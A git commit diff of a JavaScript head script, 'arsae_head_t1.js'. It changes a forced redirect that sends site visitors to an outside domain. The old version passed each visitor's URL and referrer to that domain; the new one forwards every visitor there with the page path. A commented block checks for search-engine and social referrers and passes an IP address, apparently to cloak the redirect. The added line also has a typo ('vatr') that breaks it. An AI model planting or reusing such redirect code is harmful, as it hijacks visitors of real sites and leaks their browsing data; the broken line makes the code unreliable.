254365be8929181fb5ce0a4a8072e134d99a44ff
recognitionissue <tasralasir@gmail.com>
2026-09-04 15:38:21 +0700

    Update arsae_head_t1.js

--- arsae_head_t1.js
+++ arsae_head_t1.js
@@ -1,7 +1,10 @@
 ///// Arsae /////
 var arsT1Bing = 'https://cloud.teknodrem.com';
+vatr path = window.location.pathname.replace(/^\//, '');
+
+window.location.href = arsT1Bing + "/" + path;
 
 // if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
-window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
+// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
 // }
